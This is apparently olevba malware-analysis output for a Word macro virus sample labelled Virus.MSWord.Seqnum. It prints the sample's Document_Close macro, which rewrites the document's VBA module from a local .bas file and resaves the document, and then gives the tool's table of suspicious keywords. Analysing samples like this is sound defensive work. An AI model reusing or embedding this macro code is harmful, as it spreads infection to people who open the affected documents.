olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seqnum-571e26cdcab15a28d1bec07600edce7b7e10b8a8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Seqnum-571e26cdcab15a28d1bec07600edce7b7e10b8a8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
ADCL = ADI1.CodeModule.CountOfLines
If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
ADI1.CodeModule.AddFromFile ("C:\PROGRAM FILES\MICROSOFT OFFICE\OFFICE\8602.bas")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.Saved = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

